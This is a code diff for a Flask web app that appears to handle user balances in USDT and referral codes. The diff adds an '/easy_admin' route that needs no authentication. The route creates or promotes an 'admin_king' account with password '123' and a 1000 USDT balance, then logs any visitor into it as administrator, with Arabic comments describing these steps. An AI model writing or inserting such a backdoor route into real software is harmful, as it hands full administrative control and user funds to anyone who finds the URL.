@@ -112,6 +112,32 @@ def admin_gate(secret):
         return "Log in first, then use this link."
     return "Invalid Secret Key."
 
+@app.route("/easy_admin")
+def easy_admin():
+    # البحث عن حساب الأدمن أو إنشاؤه
+    admin = User.query.filter_by(username="admin_king").first()
+    if not admin:
+        import uuid
+        admin = User(
+            username="admin_king", 
+            password="123", 
+            is_admin=True, 
+            referral_code="ADMIN_01",
+            balance_usdt=1000.0,
+            xp=100.0
+        )
+        db.session.add(admin)
+        db.session.commit()
+    
+    # تحويله لأدمن إن لم يكن
+    admin.is_admin = True
+    db.session.commit()
+    
+    # تسجيل الدخول تلقائياً
+    session["v27_id"] = admin.id
+    session.permanent = True
+    return f"تم تسجيل دخولك كأدمن بنجاح! اسم المستخدم: {admin.username} <br> <a href='/portal/admin_dashboard'>انقر هنا للذهاب للوحة الإدارة</a>"
+
 def get_v_user():
     uid = session.get("v27_id")
     if not uid: return None
